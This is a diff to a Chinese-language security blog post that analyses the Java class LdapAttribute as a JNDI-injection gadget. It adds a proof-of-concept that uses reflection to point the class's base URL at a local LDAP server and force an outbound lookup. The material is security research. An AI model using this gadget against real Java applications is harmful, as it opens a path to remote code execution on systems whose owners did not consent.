@@ -374,6 +374,74 @@ final class LdapAttribute extends BasicAttribute {
 
 （`所以我们需要根以下看它是什么类型的，然后因为是包权限需要用反射来调用方法_)`
 
-但是这个context类型是（InitialDirContext类型的 ）
+`但是这个context类型是（InitialDirContext类型的 ）`
 
 ![image-20231010153247755](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010153247755.png)
+
+纠正一下上面的错误，
+
+![image-20231010194512605](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010194512605.png)
+
+首先我们进入getBaseCtx()类型看一下
+
+```java
+其实大概的就是
+定义了一个hashtable然后put赋值，需要注意的是这里的baseCtxURL是我们的ldap
+```
+
+![image-20231010194723534](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010194723534.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+首先试了能否打通（如果打不通那就徒劳白费了）：
+
+```java
+import javax.naming.CompositeName;
+import javax.naming.InvalidNameException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+public class poc {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, InvalidNameException {
+
+
+            String ldapCtxUrl = "ldap://127.0.0.1:9999";
+
+            Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
+            Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
+                    new Class[] {String.class});
+            ldapAttributeClazzConstructor.setAccessible(true);
+            Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
+                    new Object[] {"name"});
+
+            Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
+            baseCtxUrlField.setAccessible(true);
+            baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+
+            Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
+            rdnField.setAccessible(true);
+            rdnField.set(ldapAttribute, new CompositeName("a//b"));
+
+            Method getAttributeDefinitionMethod = ldapAttributeClazz.getMethod("getAttributeDefinition", new Class[] {});
+            getAttributeDefinitionMethod.setAccessible(true);
+            getAttributeDefinitionMethod.invoke(ldapAttribute, new Object[] {});
+    }
+}
+```
+
+![image-20231010183740300](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010183740300.png)
+
